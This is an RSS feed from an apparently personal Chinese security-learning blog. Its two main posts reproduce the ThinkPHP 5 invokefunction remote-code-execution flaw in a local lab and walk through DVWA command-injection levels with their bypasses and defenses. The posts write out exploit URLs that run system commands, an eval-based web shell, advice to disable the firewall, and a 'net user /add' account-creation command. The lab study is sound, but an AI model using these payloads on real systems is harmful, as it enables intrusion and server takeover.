<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>阿卡丽的黑心商店</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>上古时代的宝贝开卖了！</description>
    <pubDate>Thu, 11 Aug 2022 06:43:42 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>数据结构</title>
      <link>http://example.com/2022/08/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</link>
      <guid>http://example.com/2022/08/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</guid>
      <pubDate>Thu, 11 Aug 2022 06:43:42 GMT</pubDate>
      
      
      
      
      
      
      <comments>http://example.com/2022/08/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RCE————thinkphp5</title>
      <link>http://example.com/2022/08/11/thinkphp5/</link>
      <guid>http://example.com/2022/08/11/thinkphp5/</guid>
      <pubDate>Thu, 11 Aug 2022 04:33:07 GMT</pubDate>
      
      <description>&lt;p&gt; 基于对RCE的学习，对著名的thinkphpv5进行漏洞复现&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p> 基于对RCE的学习，对著名的thinkphpv5进行漏洞复现</p><span id="more"></span><h2 id="搭建ThinkPHP-V5框架"><a href="#搭建ThinkPHP-V5框架" class="headerlink" title="搭建ThinkPHP V5框架"></a>搭建ThinkPHP V5框架</h2><p>首先搭建ThinkPHP V5框架，搭建过程可以参考<a href="https://blog.csdn.net/Jack_num1/article/details/105918659">thinkphp5环境搭建</a><br><img src="thinkphp5/11.png" alt="image-20220811103850543" style="zoom:50%;" /><img src="thinkphp5/2.png" alt="image-20220811104224203" style="zoom:50%;" /><br>在这个页面中可以看到并没有靶场给的那么明显的输入框，那么唯一的输入框就是ip地址的输入框</p><h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><p>进行注入尝试<br>输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php？s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;whoami<br>即在原地址后插入了从？s到whoami的命令。因为该框架是基于php语言构建所以可以执行linux命令<br>输出：<img src="thinkphp5/3.png" alt="image-20220805090923902" style="zoom:80%;" /></p><h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><p>可以看到是存在命令执行漏洞的，尝试写入shell（后门木马）<br>输入：<img src="/thinkphp5/4.png" alt="image-20220805090936740"><br>可以在thinkphpv5安装的地址中找到shell.php文件，推荐进行这步关闭防火墙，因为即便shell.php文件是空的，系统仍会警告然后删掉<br>输出：</p><img src="thinkphp5/5.png" alt="image-20220805090958493" style="zoom:67%;" /><p><strong>注意:需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不<br>用引号(单引号、双引号),部分字符url编码不编码都行。</strong><br>shell.php文件内容为&lt;?php @eval($_POST[cmd];?)</p><h2 id="夺旗"><a href="#夺旗" class="headerlink" title="夺旗"></a>夺旗</h2><p>(1)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;<br>输出：<img src="thinkphp5/6.png" alt="image-20220805091029303" style="zoom:80%;" /></p><p>(2)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;flag<br>输出：<img src="thinkphp5/7.png" alt="image-20220805091043757" style="zoom:80%;" /></p><p>(3)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;cat &#x2F;flag<br>输出：<img src="thinkphp5/8.png" alt="image-20220805091100781" style="zoom:80%;" /></p><h2 id="通过phpinfo函数查看phpinfo-信息"><a href="#通过phpinfo函数查看phpinfo-信息" class="headerlink" title="通过phpinfo函数查看phpinfo()信息"></a>通过phpinfo函数查看phpinfo()信息</h2><h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：<img src="/thinkphp5/9.png" alt="image-20220805091120896"></h3><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：<img src="thinkphp5/10.png" alt="image-20220805091130347" style="zoom:80%;" /></h3><hr><p>相关源码部分正在学习，之后补上，可别忘了</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/">网络攻防</category>
      
      <category domain="http://example.com/tags/PHP/">PHP</category>
      
      
      <comments>http://example.com/2022/08/11/thinkphp5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>千字文</title>
      <link>http://example.com/2022/08/11/%E5%8D%83%E5%AD%97%E6%96%87/</link>
      <guid>http://example.com/2022/08/11/%E5%8D%83%E5%AD%97%E6%96%87/</guid>
      <pubDate>Thu, 11 Aug 2022 02:54:31 GMT</pubDate>
      
      
      
      
      
      <category domain="http://example.com/tags/%E9%9A%8F%E7%AC%94/">随笔</category>
      
      
      <comments>http://example.com/2022/08/11/%E5%8D%83%E5%AD%97%E6%96%87/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RCE</title>
      <link>http://example.com/2022/08/10/RCE/</link>
      <guid>http://example.com/2022/08/10/RCE/</guid>
      <pubDate>Wed, 10 Aug 2022 07:40:03 GMT</pubDate>
      
      <description>&lt;p&gt;通过dvwa靶场进行对RCE漏洞的学习和复现&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>通过dvwa靶场进行对RCE漏洞的学习和复现</p><span id="more"></span><h1 id="命令执行漏洞（RCE"><a href="#命令执行漏洞（RCE" class="headerlink" title="命令执行漏洞（RCE)"></a>命令执行漏洞（RCE)</h1><h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><img src="./RCE/101.png" style="zoom:67%;" /><h2 id="常用的cmd命令"><a href="#常用的cmd命令" class="headerlink" title="常用的cmd命令"></a>常用的cmd命令</h2><p>whoami——查看当前用户名<br>ipconfig——查看网卡信息<br>shutdown -s -t 0——关机————（-s：shutdown    -t 0 ：time 0立即关机）<br>net user [username] [password] &#x2F;add——增加一个用户名为username密码为password的新用户<img src="/./RCE/201.png"><br>type [file_name]——查看filename文件内容<br><img src="RCE/301.png" alt="image-20220805143137202" style="zoom:67%;" /></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="Command-Injection-防御-low"><a href="#Command-Injection-防御-low" class="headerlink" title="Command Injection 防御 low"></a>Command Injection 防御 low</h3><h4 id="注入点-代码"><a href="#注入点-代码" class="headerlink" title="注入点(代码)"></a>注入点(代码)</h4><p><img src="/RCE/4.png"></p><h4 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h4><img src="RCE/501.png" alt="image-20220805143829190" style="zoom:67%;" /><img src="RCE/601.png" alt="image-20220805143911922" style="zoom:67%;" /><h3 id="Command-Injection-防御-low-1"><a href="#Command-Injection-防御-low-1" class="headerlink" title="Command Injection 防御 low"></a>Command Injection 防御 low</h3><p>防御命令执行的最高效的方法，就是过滤命令连接符<br>将| ；&amp; || &amp;&amp; 符号替换成空，或判断用户输入这些符号就终止执行</p><h4 id="Command-Injection-防御-medium"><a href="#Command-Injection-防御-medium" class="headerlink" title="Command Injection 防御 medium"></a>Command Injection 防御 medium</h4><p><img src="/RCE/701.png" alt="image-20220805145443638"><br>str_replace(find,replace,string,count)：字符替换函数。find：规定要查找的值replace：规定替换find中的值string：被搜索的字符串  count：对替换数进行计数的变量<br>array_keys(array,value,strict):返回一个包含所有键名的一个新数组。array：规定数组value：指定健值（可选)strict：可能的值：true  false  是否依赖类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要替换的元素少于查到到的元素</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$find</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="variable">$replace</span> = <span class="keyword">array</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$find</span>,<span class="variable">$replace</span>,<span class="variable">$arr</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">运行结果</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; B [<span class="number">1</span>] =&gt; [<span class="number">2</span>] =&gt; ! )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">); </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$substitutions</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$substitutions</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; &amp;&amp; [<span class="number">1</span>] =&gt; ; ) <span class="title function_ invoke__">Array</span> ( [&amp;&amp;] =&gt; [;] =&gt; )</span><br></pre></td></tr></table></figure><h3 id="Command-Injection-攻击-medium"><a href="#Command-Injection-攻击-medium" class="headerlink" title="Command Injection 攻击 medium"></a>Command Injection 攻击 medium</h3><p>在medium防御中看到只过滤；和&amp;&amp;，所以使用其他三种即可。<br><img src="RCE/801.png" alt="image-20220805155321480" style="zoom:67%;" /><br><img src="RCE/901.png" alt="image-20220805155720842" style="zoom:67%;" /></p><h3 id="Command-Injection-防御-high"><a href="#Command-Injection-防御-high" class="headerlink" title="Command Injection 防御 high"></a>Command Injection 防御 high</h3><p><img src="/RCE/1001.png" alt="image-20220805155807981"><br><strong>注意上面‘| ’拦截并非是|，而是|加空格</strong>————代码不规范导致的漏洞</p><h3 id="Command-Injection-攻击-high"><a href="#Command-Injection-攻击-high" class="headerlink" title="Command Injection 攻击 high"></a>Command Injection 攻击 high</h3><img src="RCE/1101.png" alt="image-20220805160204332" style="zoom:67%;" /><h3 id="Command-Injection-防御-impossible"><a href="#Command-Injection-防御-impossible" class="headerlink" title="Command Injection 防御 impossible"></a>Command Injection 防御 impossible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];        <span class="comment">//将输入内容赋值给变量$target</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );      <span class="comment">//去除用户输入的\</span></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects </span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );       <span class="comment">//把用户输入的数据根据.分开</span></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer </span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) <span class="comment">//分别判断分成的四个部分是不是数字，并判断是不是四个数字</span></span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together. </span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>]; <span class="comment">//后端格式验证，用.拼接起来</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123; </span><br><span class="line">            <span class="comment">// Windows </span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125;                                                                   </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// *nix </span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/RCE/image-20220811145451052.png" alt="image-20220811145451052"></p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/">网络攻防</category>
      
      <category domain="http://example.com/tags/RCE/">RCE</category>
      
      
      <comments>http://example.com/2022/08/10/RCE/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
